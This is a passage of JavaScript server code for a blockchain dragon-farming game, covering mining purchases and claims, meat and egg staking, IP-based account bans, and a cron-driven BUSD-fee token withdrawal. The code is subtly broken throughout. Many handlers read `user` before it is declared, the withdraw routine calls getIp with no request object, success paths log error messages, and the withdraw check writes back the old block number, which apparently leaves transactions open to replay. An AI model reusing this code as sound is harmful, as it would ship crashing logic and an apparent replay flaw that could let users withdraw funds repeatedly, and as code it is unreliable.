      if (blockNumber == 2) errorType = "Differnt address";
      if (blockNumber == 3) errorType = "Differnt admin";
      if (blockNumber == 4) errorType = "You sent scam transaction";

      if (blockNumber <= user.blockNumber) {
        RESPONSE(res, 400, {}, errorType);
        // writePriceLog(
        //   walletAddress,
        //   "Withdraw(Error)",
        //   errorType,
        //   amount,
        //   txID
        // );
        //writeLog(walletAddress, "Buy Mining", `${blockNumber}`, "ERROR");
        writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Mining", "ERROR:" + `${blockNumber}`);
        return;
      }
    } else {
      if (user.Drg < MINING[type].COST) {
        RESPONSE(res, 400, {}, "You don't have enough Drg to buy gold mine");
        //writeLog(walletAddress, "Buy Mining", `Insufficient balance`, "ERROR");
        writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Mining", "ERROR: Insufficient balance");
        return;
      }
    }
  } catch (e) {
    RESPONSE(res, 400, {}, "check transaction error");
    //writeLog(walletAddress, "Buy Mining", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Mining", "ERROR:" + e);
    return;
  }

  try {
    let results;

    switch (type) {
      case "default": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            miningModule: new Date(),
            blockNumber: blockNumber,
            miningRequest: 0,
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }

      case "gold": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            $inc: { Drg: -MINING[type].COST },
            goldMine: new Date(),
            goldMineRequest: 0,
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }

      case "uranium": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            uraniumMine: new Date(),
            blockNumber: blockNumber,
            uraniumMineRequest: 0,
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }

      case "power": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            powerMine: new Date(),
            blockNumber: blockNumber,
            powerMineRequest: 0,
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }
    }

    // writeLog(walletAddress, "Buy Mining", "Updated successfully", "SUCCESS");
    // writePriceLog(walletAddress, "Buy Mining Module", "Success", amount);
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Buy Mining", "ERROR: Insufficient balance");
    RESPONSE(res, 200, results._doc, "Buy Mining success!");
  } catch (e) {
    writeLog(walletAddress, "Buy Mining", e, "ERROR");
    RESPONSE(res, 400, {}, "Buy Mining error!");
  }
});

export const requestMining = asyncHandler(async (req, res) => {
  let { walletAddress, type } = req.body;

  //writeLog(walletAddress, "Request Mining", type, "REQUEST");
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Request Mining", "REQUEST:" + type);
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Request Mining", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Request Mining", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  let miningTime = 0;
  switch (type) {
    case "default":
      miningTime = user.miningModule;
      break;
    case "gold":
      miningTime = user.goldMine;
      break;
    case "uranium":
      miningTime = user.uraniumMine;
      break;
    case "power":
      miningTime = user.powerMine;
      break;
  }

  const check = new Date("2021-12-30T00:00:00").getTime();
  const miningModule = new Date(miningTime).getTime();

  if (check > miningModule) {
    // writeLog(
    //   walletAddress,
    //   "Request Mining",
    //   "Didn't buy mining module",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Request Mining", "Didn't buy mining module");
    RESPONSE(res, 400, {}, "Didn't buy mining module");
    return;
  }

  if (user.Drg < MINING[type].REQUEST) {
    writeLog(
      walletAddress,
      "Request Mining",
      "Drg balance is less than 300",
      "ERROR"
    );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Request Mining", "Drg balance is less than 300");
    RESPONSE(res, 400, {}, "Drg balance is less than 300");
    return;
  }

  try {
    let results;

    switch (type) {
      case "default": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            $inc: { Drg: -MINING[type].REQUEST },
            miningRequest: 1,
            miningModule: new Date(),
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }
      case "gold": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            $inc: { Drg: -MINING[type].REQUEST },
            goldMineRequest: 1,
            goldMine: new Date(),
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }
      case "uranium": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            $inc: { Drg: -MINING[type].REQUEST },
            uraniumMineRequest: 1,
            uraniumMine: new Date(),
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }
      case "power": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            $inc: { Drg: -MINING[type].REQUEST },
            powerMineRequest: 1,
            powerMine: new Date(),
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }
    }

    // writeLog(
    //   walletAddress,
    //   "Request Mining",
    //   "Updated successfully",
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Request Mining", "Updated successfully");
    RESPONSE(res, 200, results._doc, "Request Mining success!");
  } catch (e) {
    writeLog(walletAddress, "Request Mining", e, "ERROR");
    RESPONSE(res, 400, {}, "Request Mining error!");
  }
});

export const claimMining = asyncHandler(async (req, res) => {
  let { walletAddress, type } = req.body;

  //writeLog(walletAddress, "Claim Mining", type, "REQUEST");
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Claim Mining", "REQUEST:" + type);
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Premium", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Claim Mining", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (scamAction(user)) {
    RESPONSE(res, 400, "Ban", "You are banned because of scam action!");
    return;
  }

  let ipCheck = await checkIpAddress(req, user);
  if (ipCheck) {
    RESPONSE(res, 400, "Ban", "Only 5 accounts are available in a computer!");
    return;
  }

  let miningTime = 0;
  let requestMine = 0;

  switch (type) {
    case "default":
      miningTime = user.miningModule;
      requestMine = user.miningRequest;
      break;
    case "gold":
      miningTime = user.goldMine;
      requestMine = user.goldMineRequest;
      break;
    case "uranium":
      miningTime = user.uraniumMine;
      requestMine = user.uraniumMineRequest;
      break;
    case "power":
      miningTime = user.powerMine;
      requestMine = user.powerMineRequest;
      break;
  }

  if (requestMine != 1) {
    // writeLog(
    //   walletAddress,
    //   "Mine Request Error",
    //   "User didn't send request",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Mine Request Error", "User didn't send request");
    RESPONSE(res, 400, {}, "User didn't send request");
    return;
  }

  const check = new Date("2022-12-30T00:00:00").getTime();
  const miningModule = new Date(miningTime).getTime();

  if (check > miningModule) {
    // writeLog(
    //   walletAddress,
    //   "Claim Mining",
    //   "Didn't buy mining module",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Claim Mining", "Didn't buy mining module");
    RESPONSE(res, 400, {}, "Didn't buy mining module");
    return;
  }

  let date = new Date();
  let curTime = date.getTime();
  let tm = MINING[type].TIMER - Math.floor((curTime - miningModule) / 1000);

  if (tm > 0) {
    //writeLog(walletAddress, "Claim Mining", "Please wait...", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Claim Mining", "ERROR: Please wait...");
    RESPONSE(res, 400, {}, "Please wait...");
    return;
  }

  try {
    let results;

    switch (type) {
      case "default": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            Drg: user.Drg + MINING[type].CLAIM,
            miningRequest: 0,
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }
      case "gold": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            Drg: user.Drg + MINING[type].CLAIM,
            goldMineRequest: 0,
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }
      case "uranium": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            Drg: user.Drg + MINING[type].CLAIM,
            uraniumMineRequest: 0,
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }
      case "power": {
        results = await User.findOneAndUpdate(
          { walletAddress },
          {
            Drg: user.Drg + MINING[type].CLAIM,
            powerMineRequest: 0,
          },
          {
            new: true,
            upsert: true, // Make this update into an upsert
          }
        );
        break;
      }
    }

    //writeLog(walletAddress, "Claim Mining", "Updated successfully", "SUCCESS");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Claim Mining", "Updated successfully");
    RESPONSE(res, 200, results._doc, "Claim Mining success!");
  } catch (e) {
    writeLog(walletAddress, "Claim Mining", e, "ERROR");
    RESPONSE(res, 400, {}, "Claim Mining error!");
  }
});

//////////////////////

export const saveDiscord = asyncHandler(async (req, res) => {
  let { walletAddress, discord } = req.body;

  //writeLog(walletAddress, "Change discord name", "", "REQUEST");
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Change discord name", "REQUEST");
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });
  if (!user) {
    // writeLog(
    //   walletAddress,
    //   "Change discord name",
    //   "User does not exist",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Change discord name", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  try {
    let results = await User.findOneAndUpdate(
      { walletAddress },
      {
        discord: discord,
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );

    // writeLog(
    //   walletAddress,
    //   "Change discord name",
    //   "Updated database successfully",
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Change discord name", "Updated database successfully");
    RESPONSE(res, 200, results._doc, "Success update swap!");
  } catch (e) {
    //writeLog(walletAddress, "Change discord name", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Change discord name", "ERROR" + e);
    RESPONSE(res, 400, {}, "Change discord name error!");
  }
});

export const plantMeat = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;

  //writeLog(walletAddress, "Plant meat", "Plant", "REQUEST");
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Plant meat", "REQUEST");
  walletAddress = walletAddress.toLowerCase();

  const user = await User.findOne({ walletAddress });

  const check = new Date("2021-12-30T00:00:00").getTime();
  const miningModule = new Date(user.powerMine).getTime();

  if (check > miningModule) {
    //writeLog(walletAddress, "Request Plant", "Didn't buy power plant", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Request Plant", "Didn't buy power plant");
    RESPONSE(res, 400, {}, "Didn't buy power plant");
    return;
  }

  let diamondPos = [],
    birdPos = [];

  // map1
  for (let i = 0; i < 8; i++) {
    if (checkStakedStatus(user.stakedDiamond, i)) diamondPos.push(i);
    if (checkStakedStatus(user.stakedBirds, i)) birdPos.push(i);
  }
  // map2 - area1
  if (checkStakedStatus(user.stakedDiamond, 10)) diamondPos.push(10);

  // map2 - area2

  if (user.opendPlace.includes(1)) {
    for (let i = 0; i < 3; i++)
      for (let j = 0; j < 8; j++)
        if (checkStakedStatus(user.stakedBirds, 200 + i * 10 + j))
          birdPos.push(200 + i * 10 + j);
  }

  // map2 - area3
  if (user.opendPlace.includes(2)) {
    for (let i = 0; i < 8; i++)
      if (checkStakedStatus(user.stakedDiamond, 30 + i))
        diamondPos.push(30 + i);
  }

  // map2 - area4
  if (user.opendPlace.includes(3)) {
    for (let i = 0; i < 2; i++)
      for (let j = 0; j < 8; j++)
        if (checkStakedStatus(user.stakedBirds, 400 + i * 10 + j))
          birdPos.push(400 + i * 10 + j);
    for (let i = 0; i < 4; i++)
      if (checkStakedStatus(user.stakedDiamond, 40 + 2 + i))
        diamondPos.push(40 + 2 + i);
  }

  if ((diamondPos.length + birdPos.length) * 20 > user.Drg) {
    //writeLog(walletAddress, "Plant all resourcce", "Not enough Drg", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Plant all resourcce", "Not enough Drg");
    RESPONSE(res, 400, {}, "Sorry, you don't have enough Drg to plant all");
    return;
  }

  if (diamondPos.length + birdPos.length == 0) {
    // writeLog(
    //   walletAddress,
    //   "No plantable meat",
    //   "Sorry, you don't have any plantable meat!",
    //   "Error"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "No plantable meat", "Sorry, you don't have any plantable meat!");
    RESPONSE(res, 201, {}, "Sorry, you don't have any plantable meat!");

    return;
  }

  let _stakedDiamond = [...user.stakedDiamond];
  for (let item of diamondPos) {
    _stakedDiamond.push({ position: item, diamond: 1, staked_at: new Date() });
  }

  let _stakedBirds = [...user.stakedBirds];
  for (let item of birdPos) {
    _stakedBirds.push({ position: item, staked_at: new Date() });
  }

  let results = await User.findOneAndUpdate(
    { walletAddress },
    {
      Drg: user.Drg - 20 * (birdPos.length + diamondPos.length),
      meatRequest: user.meatRequest + 5 * diamondPos.length,
      eggsRequest: user.eggsRequest + birdPos.length,

      stakedBirds: _stakedBirds,
      stakedDiamond: _stakedDiamond,
    },
    {
      new: true,
      upsert: true, // Make this update into an upsert
    }
  );

  // writeLog(
  //   walletAddress,
  //   "Plant all meat",
  //   "Updated database successfully",
  //   "SUCCESS"
  // );
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Plant all meat", "Updated database successfully");
  RESPONSE(res, 200, results._doc, "Claim all meat successfully!");
});

const checkStakedStatus = (stakedData, pos) => {
  const found = stakedData.find((elem) => elem.position == pos);
  if (found == undefined) return true;
  return false;
};

export const getMeat = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;

  // writeLog(walletAddress, "Plant meat", "Get", "REQUEST");
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Plant meat", "REQUEST");
  walletAddress = walletAddress.toLowerCase();

  const user = await User.findOne({ walletAddress });

  if (!user) {
    //writeLog(walletAddress, "Premium", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Premium", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (scamAction(user)) {
    RESPONSE(res, 400, "Ban", "You are banned because of scam action!");
    return;
  }

  let ipCheck = await checkIpAddress(req, user);
  if (ipCheck) {
    RESPONSE(res, 400, "Ban", "Only 5 accounts are available in a computer!");
    return;
  }

  const check = new Date("2021-12-30T00:00:00").getTime();
  const miningModule = new Date(user.powerMine).getTime();

  if (check > miningModule) {
    //writeLog(walletAddress, "Request Plant", "Didn't buy power plant", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Request Plant", "Didn't buy power plant");
    RESPONSE(res, 400, {}, "Didn't buy power plant");
    return;
  }

  let _stakedBirds = [...user.stakedBirds];
  let _stakedDiamond = [...user.stakedDiamond];

  let birdCount = 0,
    diamondCount = 0;
  for (let data of user.stakedBirds) {
    let expiredTime = new Date(data.staked_at);
    let curTime = new Date();

    if (expiredTime.getTime() + STAKE_TIMER * 1000 > curTime.getTime()) {
      continue;
    }

    birdCount++;
    _stakedBirds = _stakedBirds.filter(
      (item) => item && item.position != data.position
    );
  }

  for (let data of user.stakedDiamond) {
    let expiredTime = new Date(data.staked_at);
    let curTime = new Date();

    if (expiredTime.getTime() + STAKE_TIMER * 1000 > curTime.getTime()) {
      continue;
    }

    diamondCount++;
    _stakedDiamond = _stakedDiamond.filter(
      (item) => item && item.position != data.position
    );
  }

  if (birdCount == 0 && diamondCount == 0) {
    // writeLog(
    //   walletAddress,
    //   "No claimable meat",
    //   "Sorry, you don't have any claimable meat!",
    //   "Error"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "No claimable meat", "Sorry, you don't have any claimable meat!");
    RESPONSE(res, 201, {}, "Sorry, you don't have any claimable meat!");

    return;
  }

  let results = await User.findOneAndUpdate(
    { walletAddress },
    {
      eggsRequest: user.eggsRequest - 1 * birdCount,
      eggs: user.eggs + 1 * birdCount,
      stakedBirds: _stakedBirds,

      meatRequest: user.meatRequest - 5 * diamondCount,
      meat: user.meat + 5 * diamondCount,
      stakedDiamond: _stakedDiamond,
    },
    {
      new: true,
      upsert: true, // Make this update into an upsert
    }
  );

  // writeLog(
  //   walletAddress,
  //   "Claim All meat",
  //   "Updated database successfully",
  //   "SUCCESS"
  // );
  writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "Claim All meat", "Updated database successfully");
  RESPONSE(res, 200, results._doc, "Claim all meat successfully!");
});

const checkPositionStakable = (data, pos, type = "bird") => {
  let diamondPos = [],
    birdPos = [];

  // map1
  for (let i = 0; i < 8; i++) {
    if (checkStakedStatus(data.stakedDiamond, i)) diamondPos.push(i);
    if (checkStakedStatus(data.stakedBirds, i)) birdPos.push(i);
  }
  // map2 - area1
  if (checkStakedStatus(data.stakedDiamond, 10)) diamondPos.push(10);

  // map2 - area2

  if (data.opendPlace.includes(1)) {
    for (let i = 0; i < 3; i++)
      for (let j = 0; j < 8; j++)
        if (checkStakedStatus(data.stakedBirds, 200 + i * 10 + j))
          birdPos.push(200 + i * 10 + j);
  }

  // map2 - area3
  if (data.opendPlace.includes(2)) {
    for (let i = 0; i < 8; i++)
      if (checkStakedStatus(data.stakedDiamond, 30 + i))
        diamondPos.push(30 + i);
  }

  // map2 - area4
  if (data.opendPlace.includes(3)) {
    for (let i = 0; i < 2; i++)
      for (let j = 0; j < 8; j++)
        if (checkStakedStatus(data.stakedBirds, 400 + i * 10 + j))
          birdPos.push(400 + i * 10 + j);
    for (let i = 0; i < 4; i++)
      if (checkStakedStatus(data.stakedDiamond, 40 + 2 + i))
        diamondPos.push(40 + 2 + i);
  }

  if (type == "diamond") {
    const found = diamondPos.find((elem) => elem == pos);
    if (found == undefined) return false;
    return true;
  }

  if (type == "bird") {
    const found = birdPos.find((elem) => elem == pos);
    if (found == undefined) return false;
    return true;
  }

  return false;
};

const doWithdrawRequest = async (_id, wAddress, amount, txID) => {
  console.log("do withdraw request");
  let walletAddress = wAddress.toLowerCase();

  // withdrawLog(walletAddress, "Withdraw", " --process start-- ", amount, txID);
  // writePriceLog(walletAddress, "Withdraw", "--process start--", amount, txID);
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw", "--process start--" + amount);
  // await Withdraw.deleteOne({_id:_id}).then(function(){
  //     console.log("deleted successfully");
  // }).catch(function(error){
  //     console.log(error);
  // });

  const user = await User.findOne({ walletAddress });

  if (!user) return;
  if (txID == "") return;
  if (amount <= 0) return;
  let bcsAmount = Math.floor(amount / 10);

  let blockNumber = 1;
  // ------------------------ Start Checking 1 BUSD ------------------------
  try {
    blockNumber = await checkTransaction(walletAddress, txID, 5, "BUSD");

    let errorType = "You sent scam transaction 1";
    if (blockNumber == 1) errorType = "You sent differnt amount of BUSD";
    if (blockNumber == 2) errorType = "You didn't sent BUSD Token";
    if (blockNumber == 3)
      errorType = "You didn't sent 1 BUSD(fee) to admin address";
    if (blockNumber == 4) errorType = "You sent scam transaction 2";

    if (blockNumber <= user.blockNumber) {
      // writePriceLog(walletAddress, "Withdraw(Error)", errorType, amount, txID);
      // withdrawLog(walletAddress, "Withdraw Fee (1BUSD)", errorType, "ERROR");
      // withdrawLog(
      //   walletAddress,
      //   "Withdraw Fee (1BUSD)",
      //   blockNumber + ":" + user.blockNumber,
      //   "ERROR"
      // );
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw Fee (1BUSD)", "ERROR:" + errorType);
      return;
    }
  } catch (e) {
    console.log("Error2");
    //withdrawLog(walletAddress, "Withdraw Fee (1BUSD)", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw Fee (1BUSD)", "ERROR:" + e);
    return;
  }

  await User.findOneAndUpdate(
    { walletAddress },
    {
      blockNumber: user.blockNumber,
    },
    {
      new: true,
      upsert: true, // Make this update into an upsert
    }
  );
  //withdrawLog(walletAddress, "Withdraw", "Database Update", "SUCCESS");
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw", "Database Update");

  // ------------------------ Start Sending BCS to Users ------------------------
  try {
    console.log("send token");
    await sendToken(
      walletAddress,
      POOL_WALLET_ADDRESS[chainId],
      walletAddress,
      bcsAmount
    );
    // withdrawLog(
    //   walletAddress,
    //   "Withdraw",
    //   "Sent " + bcsAmount + "BCS",
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw", "Sent " + bcsAmount + "BCS");
  } catch (e) {
    // withdrawLog(
    //   walletAddress,
    //   "Withdraw",
    //   "Didn't sent " + bcsAmount + "BCS",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Withdraw", "Didn't sent " + bcsAmount + "BCS");
    console.log("Error3");
    return;
  }
};

const scamAction = (user) => {
  if (!user || user == null || user == undefined) return true;
  if (user.isvip) return false;
  // if(user.isblock >= 10) return true;
  return false;
};

export const main = async () => {
  let job_setGame = new CronJob("*/15 * * * * *", async function () {
    const data = await Withdraw.find({}).sort({ _id: 1 }).limit(1);
    // const data = await Withdraw.findOne({}).sort({"_id":1});
    if (data && data._doc) {
      // console.log(data._doc);
      doWithdrawRequest(data._id, data.walletAddress, data.amount, data.txId);
    }
  });
  job_setGame.start();
};

main();

const getIp = (req) => {
  let ip = req.connection.remoteAddress;
  if (!ip || ip == undefined || ip == null) return "";
  ip = ip.replace("::ffff:", "");

  if (ip == "127.0.0.1") {
    ip = req.headers["x-real-ip"];
  }
  return ip;
};

const checkIpAddress = async (req, user) => {
  let ip = getIp(req);
  let cnt = await User.countDocuments({ ipAddress: ip });
  //console.log("ip, cnt", ip, cnt);

  if (ip == "") return true;
  if (user.ipAddress == "") {
    await User.findOneAndUpdate(
      { walletAddress: user.walletAddress },
      {
        ipAddress: ip,
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );
    return true;
  }
  if (cnt <= 8) return false;
  if (user.isvip == 1) return false;

  await User.updateMany(
    { ipAddress: ip },
    {
      $inc: { isblock: 100 },
    },
    {
      new: true,
      upsert: true, // Make this update into an upsert
    }
  );

  return true;
};

const sumAmounts = (hs) => {
  if (hs.length > 0) {
    return hs.reduce((previouse, current) => {
      return previouse + parseInt(current.amount);
    }, 0);
  } else return 0;
};

const _get24Withdrew = async (walletAddress) => {
  const now = new Date();
  const start = new Date(now.getTime() - 24 * 60 * 60 * 1000);

  // console.log(walletAddress, 'date range: ', start, now)
  const history = await Withdraw.find({
    walletAddress: { $eq: walletAddress },
    createdAt: { $gte: start, $lt: now },
  });
  console.log(`found ${history.length} items of withdraw history`);
  return sumAmounts(history);
};

export const getIsPremium = async (address) => {
  const user = await User.findOne({
    walletAddress: address,
    premium: {
      $gte: new Date(new Date().getTime() - 30 * 24 * 60 * 60 * 1000),
    },
  });

  if (user) {
    return true;
  }

  return false;
};

export const checkWithdrawable = async (walletAddress, amount) => {
  // const now = new Date()
  // const start = new Date(now.getTime() - 24 * 60 * 60 * 1000)

  // // console.log(walletAddress, 'date range: ', start, now)
  // const history = await Withdraws.find({
  //     walletAddress: { $eq: walletAddress },
  //     createdAt: { $gte: start, $lt: now }
  // })

  // const total24 = sumAmounts(history)

  const total24 = await _get24Withdrew(walletAddress);

  const price = await getBcsPrice();
  const bcsAmount = Math.floor(amount / 10);

  const estimateValue = (total24 + bcsAmount) * price;
  const isPremium = await getIsPremium(walletAddress);

  const maximumValue = isPremium ? 10 : 5;

  console.log("bcs price: ", walletAddress, price, total24, estimateValue);
  if (estimateValue < maximumValue) {
    return { withdrawable: true, maximumValue };
  } else {
    return { withdrawable: false, maximumValue };
  }
};

export const getCheckWithdrawable = async (req, res) => {
  let { walletAddress, amount } = req.body;

  walletAddress = walletAddress.toLowerCase();

  if (!walletAddress || amount < 0) {
    RESPONSE(res, 400, {}, "");
    return;
  }

  const { withdrawable, maximumValue } = await checkWithdrawable(
    walletAddress,
    amount
  );

  RESPONSE(res, 200, { withdrawable, maximumValue }, "");
};

export const get24Withdrew = asyncHandler(async (req, res) => {
  const { walletAddress } = req.body;

  if (!walletAddress) {
    RESPONSE(res, 400, {}, "invalid wallet address");
    return;
  }

  const amount = await _get24Withdrew(walletAddress.toLowerCase());
  console.log("24h amount", amount, " for wallet ", walletAddress);
  if (amount === 0) {
    RESPONSE(res, 200, { withdrawed: 0 }, "");
    return;
  } else {
    const bcsPrice = await getBcsPrice();
    const bcsAmount = Math.floor(amount / 10);

    console.log(
      "24h amount",
      amount,
      "bcs price",
      bcsPrice,
      "bcs amount",
      bcsAmount
    );

    RESPONSE(
      res,
      200,
      { withdrawed: bcsAmount * bcsPrice, bcsPrice: bcsPrice },
      ""
    );
    return;
  }
});

export const getBcsTokenPrice = asyncHandler(async (req, res) => {
  const price = await getBcsPrice();

  RESPONSE(res, 200, { price }, "");
});

const randomHexString = () => {
  const hexString = Math.floor(Math.random() * 16777215).toString(16);
  return hexString.padStart(6, "0");
};

export const getProfile = asyncHandler(async (req, res) => {
  console.log(1)
  let { walletAddress, dragon } = req.body;
  walletAddress = walletAddress.toLowerCase();

  const user = await User.findOne({ walletAddress });
  if (!user) {
    const newUser = new User({
      walletAddress: walletAddress,
      stakedDiamond: [],
      stakedBirds: [],
      parent: "",
      userRef: randomHexString(),
      ipAddress: getIp(req),
      isvip: 0,
      room: {
        chapter: 1,
        section: 1,
      },
      dragons: [{
        dragonName: 'siren-1',
        dragonNo: 0,
        hp: 1200,
        critical: 10,
        energy: 100,
        exp: 20,
        damage: 150,
        rarity: 0
      }],
      wall: 1,
    });
    await newUser.save();
    return RESPONSE(
      res,
      200,
      { user: newUser._doc, purchase: null, embed: null },
      ""
    );
  }
  const purchase = await Item.find({
    user: walletAddress,
  });
  const embed = await Embeditem.find({
    user: walletAddress,
  });
  RESPONSE(res, 200, { user: user._doc, purchase, embed }, "");
});
export const reviveItem = asyncHandler(async (req, res) => {
  let { walletAddress, dragon, item } = req.body;
  walletAddress = walletAddress.toLowerCase();

  // console.log(user)

  await changePurchaseItem(walletAddress, dragon, item, 1);
  await changeEmbedItem(walletAddress, dragon, item);
  const user = await User.findOne({
    walletAddress
  });
  const purchase = await Item.find({
    user: walletAddress,
  });
  const embed = await Embeditem.find({
    user: walletAddress,
    dragon,
  });

  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Item Change", user.currentDragonName + ":" + item + " Removed");
  RESPONSE(res, 200, { user: user._doc, purchase, embed }, "");
});
export const modifyItem = asyncHandler(async (req, res) => {
  let {
    walletAddress,
    dragon,
    item,
    amount,
    currentChaper,
    currentSection,
    selectChapter,
    selectSection,
  } = req.body;
  let filter = "";
  if (item.includes("gem")) filter = "gem";
  if (item.includes("infernal")) filter = "infernal";
  if (item.includes("chimera")) filter = "chimera";

  walletAddress = walletAddress.toLowerCase();
  let itemModel = await Item.findOne({ user: walletAddress, item });
  let embeditemModel = await Embeditem.findOne({
    user: walletAddress,
    dragon,
    item: { $regex: filter },
  });
  let user = await User.findOne({
    walletAddress,
  });

  if (amount === 1 && item !== "loot") {
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Item Earn", item + " Added");
  }
  //
  if (!itemModel && !amount) {
    return RESPONSE(res, 200, 0, "");
  }
  if (amount === -1 && item !== "loot") {
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Item Change", user.currentDragonName + ":" + item + " Added");
    if (embeditemModel) {
      await changePurchaseItem(
        walletAddress,
        dragon,
        embeditemModel.item,
        1
      );
      await changePurchaseItem(walletAddress, dragon, item, -1);
      await changeEmbedItem(walletAddress, dragon, embeditemModel.item);
      await changeEmbedItem(walletAddress, dragon, item);

    } else {
      await changePurchaseItem(walletAddress, dragon, item, -1);
      await changeEmbedItem(walletAddress, dragon, item);
    }
  } else {
    if (amount === 1 && item === "loot") {
      let user = await User.findOne({
        walletAddress,
      });
      console.log(user.dragon.filter(dragon => dragon.dragonName === user.currentDragonName)[0].exp);

      if (selectSection === 2 || selectSection === 4) {
